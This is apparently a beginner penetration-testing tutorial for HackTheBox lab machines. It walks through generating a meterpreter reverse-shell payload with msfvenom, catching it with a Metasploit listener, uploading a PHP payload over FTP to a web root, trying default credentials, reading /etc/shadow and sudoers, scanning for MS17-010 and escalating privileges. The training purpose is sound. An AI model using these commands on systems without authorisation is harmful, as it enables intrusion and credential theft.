---
description: >-
  Take your hacking skills beyond automatic tools like Metasploit, to understand
  what hacking is really about.
---

# Part 2 - Hacking manually

## What do you learn in this part?

* Hacking manually with the Metasploit framework
* Linux terminal tricks
* Nmap options and scripts
* Credential abuse
* Privilege escalation
* Hacking more boxes!

**Boxes that are suitable for this part**

* Devel - 10.10.10.5
* Mirai - 10.10.10.48

**Other relevant boxes**

* * Blocky
* Optimum

## **Hacking manually with the Metasploit framework**

Previously we used Metasploit to automagically exploit a vulnerability and get a shell on a box. But what kind of black magic does Metasploit do? Let's break it down:

1. It prepares a payload - a reverse shell - the code that executes on the target.
2.  It prepares a listener/handler for receiving the reverse shell
3. It uses a prepared exploit to exploit a vulnerable service. Which means it gets code execution on the target, and is then able to execute the payload.

The listener catches the reverse shell connection - we now have a connection / reverse shell on the target, but we can't always rely on Metasploit to do this for us.

### 1 - Preparing the payload

First we prepare a payload with the correct file extension. The payload has to match your listener in Metasploit, and the technology on the target. Imagine a web-server running IIS, and we've found out we can upload files and where the files are put. Let's generate an ASPX-payload using msfvenom:

`msfvenom -p windows/meterpreter/reverse_tcp lhost=your_ip_addr lport=4444 -f aspx -o yourname.aspx`

* -p = payload
* -f = format
* -o = outputfile.extension

![](.gitbook/assets/image%20%287%29.png)

We then use the `cat`command to print the contents of the file we generated. As you can see it's a bunch of mumbo jumbo code, but this is actually the _payload_, the code that will execute on the system to give you access.

![](.gitbook/assets/image%20%2822%29.png)

### 2 - Setting up a listener

Now that we have prepared our payload, we open msfconsole, which we will use to deliver our payload to the target box.

`msfconsole` 

![](.gitbook/assets/image%20%285%29.png)

Select the handler module, which let's us set up a listener to "catch" our shell from the payload we created:

`use exploit/multi/handler`

Set the correct payload \(needs to be identical to the payload we specified in `msfvenom`. If it does not match, it will not work properly and you will most likely not get a reverse shell back.

`set payload windows/meterpreter/reverse_tcp` 

Now that our payload is selected we're going to do is to check what options we have to set. So we type `options`

![](.gitbook/assets/image%20%2810%29.png)

As you can see below there are three required options that must be set to start the listener. We also note that two of the options are already set for us. Hence, the only thing we have to do is set the listener address \(lhost\) option. The lhost and lport options must match exactly those we set when we created our payload. We don't need to use the IP address can also just set lhost to tun0, which is the VPN-adapter used for connecting to HackTheBox.

`set lhost tun0`

`set lport 4444` 

Once you have done this, type `options` to verify that you have set all the required options correctly.  Some of them are filled automatically, and some must be manually entered.

![](.gitbook/assets/image%20%2817%29.png)

We now start our listener, the `-j` option runs the listener in the background, so you can continue using msfconsole while it's listening for incoming sessions. Please also note that sometimes the listener will start on the wrong IP address, so much sure it's correct. Usually this problem is fixed by setting the lhost again, and running the exploit command again.

`exploit -j`

To see currently active listeners, use the "jobs" command:

`jobs`

To see all currently active sessions you can type:

`sessions` 

To interact with a session use the following command, where n is the numbered session you wish to interact with.

`sessions -i  n`

ctrl+z is the shortcut to background sessions.

### 3 - Running an exploit

Ok, so we have prepared our payload and listener. Now we need to actually find a way to upload and execute this payload on our target. In Part 1 of this guide we used an already prepared exploit module in Metasploit to exploit the target, but this time we actually have to manually do the uploading and execution. First, try to find a way to upload the payload to the machine. Many services like FTP \(port 21\) and SSH \(port 22\) allow file uploads. You then need some way to execute it. When you are able to find a way, remember to have your listener ready so your payload, the reverse shell can call back to your listener.

#### Uploading files to the target

The figure below shows a simple example where we use FTP to upload a payload to the server. In the green box in the bottoom left corner you can see we first navigate to the `/var/www/html` directory, which is a common directory for web servers on Linux systems. We then use the `put` command to upload a payload, in this case a PHP file since we are hoping to trigger it from the web server that runs PHP.

![File upload to target using FTP](.gitbook/assets/image%20%286%29.png)

#### Executing payload on the target

Now that we have successfully uploaded our payload, we need to execute it on the box. Maybe you remember from part 1 that this is called "code execution". It means we are executing arbitrary code on the target machine. As you can see in step 2 in the figure below, we navigate to the IP address of the target machine in the web browser and trigger the file we uploaded earlier. How does this work? Well, if you see the previous step above, we put the file in the web directory of the target, so the file is accessible on port 80, that is through HTTP. When we run this file in the browser, it executes the code it contains, the payload, which is a reverse shell. That makes it connect back to our machine and we get a reverse shell. We have now successfully compromised that machine.

![Executing a payload on the target](.gitbook/assets/image.png)

#### I'm not that lucky

* What if no service appears to be vulnerable and I can't find any exploit?
* What if there is no obvious way like uploading a file using FTP or SSH?
* What if let's say only port 80 is open? 

This will happen to you, often. So, how do we then get our payload on the target?

We need to start exploring more manual ways of getting our payload on the target. Since port 80 is open it means the target is running a web server. So start by navigating to the IP address of the target in the web browser in Kali. Start looking around and take a good look at what the webapp is. Is is a shop of any kind, a wordpress blog, does it have a login portal? Explore the source code of the page.

Remember, the kinds of vulnerabilities we found earlier have been oon a lower level, that is vulenrabilities in the server itself. Now we are hunting for vulnerabilities that reside in the web application itself. This is a whole new game, so we have dedicated entire [Part 3](part-3-web-hacking.md) of this guide to it.

## **Credential abuse**

Reuse of credentials \(usernames, passwords and keys\) and default credentials are the most common vulnerabilities, and you will see it everywhere. It's such an easy win if it works that you must never forget to at least try even though it may seem unlikely.

* Try defaults like: `admin/password` and `admin/admin`
* Google default creds for whatever you are looking at. E.g. _"wordpress default login"._
* Combine different usernames and passwords you find around. You never know where somebody could have reused them.

A fun exercise here can be to google your own home router make and model to see if you can find the default username and password. If you are the legal owner of the router, try to log in and see what happens!

![](https://lh3.googleusercontent.com/7mdc-kMI1RuZJ5sgYeDmlH26L2AOSULraoWBllzrqrivEGEYo9TpZFBCYL0cMbVTVIyhUbnhxT6go7Cp18kNmo9RPGX93Slky-CnhAHi9P1OlqgLCI7EDl5rCFp9IY-6fgr-bfm6ZWM)

## **Linux terminal**

For help with a command, type command and then

`-h`  or `--help`

`man <command>` - Displays the man\(ual\) page for command line tools

`cat` - Display the contents of files

`less <filename>` - view and navigate the contents of a file

`grep` - search for words inside a file ``

`find` - locate files and directories

`locate <filename>` - locate a file

`strings`  - find text in files 

`ssh <username>@>ip-address>` - connect to a box using SSH \(secure shell\) on port 22

`<` and `>` is called redirection. That means you can take the output of a command and write it to another file. See example below with `echo` and `>` If the `filename.txt` file does not exist it will be created.

`echo “string” > filename.txt` 

`python -m SimpleHTTPServer 80`  - Start a simple web server to host files on Kali

`wget <ip-address>/<filename>` - Download a file from a server

`apt install <name-of-program>` - Installing things in Kali 

## **Nmap tricks**

Let's refresh some of the nmap options we used earlier and take a look at some new ones.

`-A` OS detection, version detection, script scanning, and traceroute. Gives a lot of useful info which will help you find vulnerabilities

`-v` verbose, provides more output when scanning

`-n` skip DNS resolve, saves some time scanning

So the command becomes

`nmap <ip-address> -A -n -v`

### Nmap scripts

The nmap scripting engine can be quite useful to improve the discovery of services. Kali comes with a lot of nmap scripts you can find here, using the `ls` command

`ls -la /usr/share/nmap/scripts/*`

Here is the command, but with a wildcard \(\*\) to look up all scripts that start with smb. Maybe you remember that SMB is the file sharing protocol for windows, which is great for hackers because it can be used for so much, and is a generally vulnerable protocol. The MS17-010 exploit that we had a quick look at in Part 1 was an SMB exploit.

![](.gitbook/assets/image%20%2826%29.png)

So let's try to use nmap with a script. It can also be wise to supply nmap with a port when you are scanning specific services. You can do this with the `-p` option followed by the port. See the example below using port 139 and 445 \(SMB runs on these\) for running a script that scans for the MS17-010 vulnerability from earlier in this guide.

`nmap <ip-address> --script <nameOfScript>` 

`nmap 10.10.10.10 --script smb-vuln-ms17-010 -p 139,445`

## **Privilege escalation**

In the beginning of your hacking journey, privilege escalation can be very daunting. Because you don't really know exactly what you're looking for. That's why we have the entire [fourth part of this guide](part-4-privilege-escalation.md) dedicated to breaking it down into simple steps. However, to make sure you don't get stuck in the mud at this point, we have included some of the basics which might help. You will probably see these tricks repeated with further detail in part four.

### Linux

For linux: [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Confidential information and users that you can check.

`id`

`su` 

`sudo -l` 

`cat /etc/passwd` 

`cat /etc/shadow` 

`cat /etc/group` 

`cat /etc/sudoers` 

`ls -alh /var/www/` 

`ls -ahlR /root/` 

`ls -ahlR /home/`

### Windows

#### Metasploit exploit suggester

If you have gotten a Meterpreter session on a windows box but you realize you are not an administrator you have to escalate your privileges. Sometimes, boxes are not properly patched and you can use local exploits that exploit vulnerabilities in the Windows kernel to escalate. Metasploit has several post modules for this purpose. Post means they can only be used after you have compromised the machine and gotten a Meterpreter or shel. However, we need to find such exploits and the exploit suggester automatically searches for exploits that may allow you to escalate privileges.

When we get a meterpreter we see a message that says somethinfg like "Meterpreter session 1 opened" followed by us getting an interactive Meterpreter session in msfconsole. 

![](.gitbook/assets/image%20%2819%29.png)

This is obviously enough called a _session._ When we use the exploit suggester, we already have a session 1 set up. If we press ctrl-z we are asked if we want to background our current session. Press y to do that. You are not back in the regular msfconsole, while your session is kept a`l`ive in the background. You can now do the following:

`use post/multi/recon/local_exploit_suggester`

`set session 1`

`exploit`

![](.gitbook/assets/image%20%2815%29.png)

Now that the suggester has done its job, you will probably get a couple of suggestions for exploits. There are ways to properly verify whether they will work, but that is out of scope for this guide. We recommend that you try each one of the exploits, by using the `use` command in msfconsole with the exploit path, setting the session to your current meterpreter session and runnign it by typing `exploit` as before. If you are lucky, it will spawn a new meterpreter session with elevated privileges. That means you have successfully escalated your privileges from a local user to a local administrator. You are now in full control of your target!

* [https://www.rapid7.com/db/modules/post/multi/recon/local\_exploit\_suggester](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester)
* [https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

![](https://lh5.googleusercontent.com/P9kkB83xhsIMurqs2eIfvqmyUoUvl0SZ86SrZ1uwAXVSIfS4IltiCtg0xrdmy1TIWjcgxSnw95COoiz85FufBJ3UMHAApaunUnOTjULuUoksp2tmE92h-XWAI8dZH28mI72aKEZagL8)

